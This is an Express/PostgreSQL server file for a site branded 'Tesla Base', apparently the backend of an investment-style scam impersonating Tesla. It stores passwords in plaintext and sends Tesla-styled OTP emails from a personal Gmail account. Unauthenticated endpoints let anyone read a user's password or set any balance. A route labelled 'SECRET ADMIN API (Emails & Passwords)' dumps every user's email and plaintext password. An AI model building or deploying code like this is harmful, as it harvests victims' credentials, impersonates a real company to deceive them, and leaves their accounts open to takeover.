const express = require('express');
const { Pool } = require('pg');
const nodemailer = require('nodemailer');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// 1. DATABASE CONNECTION
const pool = new Pool({
    connectionString: "YOUR_POSTGRESQL_URL_HERE",
    ssl: { rejectUnauthorized: false }
});

// 2. GMAIL CONFIGURATION
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'YOUR_GMAIL@gmail.com',
        pass: 'xxxx xxxx xxxx xxxx' // 16-character App Password
    }
});

let otpStore = {};

// 3. AUTHENTICATION & REGISTRATION
app.post('/api/auth/register', async (req, res) => {
    const { email, password } = req.body;
    try {
        const check = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
        if (check.rows.length > 0) return res.status(400).json({ error: "Email exists" });
        
        await pool.query('INSERT INTO users (email, password, balance) VALUES ($1, $2, $3)', [email, password, 0.00]);
        res.json({ success: true });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/auth/send-otp', async (req, res) => {
    const { email } = req.body;
    const otp = Math.floor(100000 + Math.random() * 900000);
    otpStore[email] = otp;
    try {
        await transporter.sendMail({
            from: '"Tesla Base Security" <YOUR_GMAIL@gmail.com>',
            to: email,
            subject: 'Verification Code: ' + otp,
            html: `<div style="background:#000;color:#fff;padding:20px;border:1px solid #E31937;"><h1>TESLA BASE</h1><p>Your code is: <b>${otp}</b></p></div>`
        });
        res.json({ success: true });
    } catch (e) { res.status(500).json({ success: false }); }
});

app.post('/api/auth/verify-otp', (req, res) => {
    const { email, otp } = req.body;
    if (otpStore[email] == otp) {
        delete otpStore[email];
        res.json({ success: true });
    } else { res.status(400).json({ success: false }); }
});

// 4. USER DATA
app.get('/api/user/data', async (req, res) => {
    const { email } = req.query;
    try {
        const result = await pool.query('SELECT email, password, balance FROM users WHERE email = $1', [email]);
        res.json(result.rows[0]);
    } catch (e) { res.status(500).json(e); }
});

app.post('/api/user/update-balance', async (req, res) => {
    const { email, newBalance } = req.body;
    try {
        await pool.query('UPDATE users SET balance = $1 WHERE email = $2', [newBalance, email]);
        res.json({ success: true });
    } catch (e) { res.status(500).json(e); }
});

// 5. SECRET ADMIN API (Emails & Passwords)
app.get('/api/admin/users', async (req, res) => {
    try {
        const result = await pool.query('SELECT email, password, balance FROM users ORDER BY id DESC');
        res.json(result.rows);
    } catch (err) { res.status(500).json({ error: "Admin query failed" }); }
});

app.listen(3000, () => console.log('Tesla Base Server Live on Port 3000'));
    
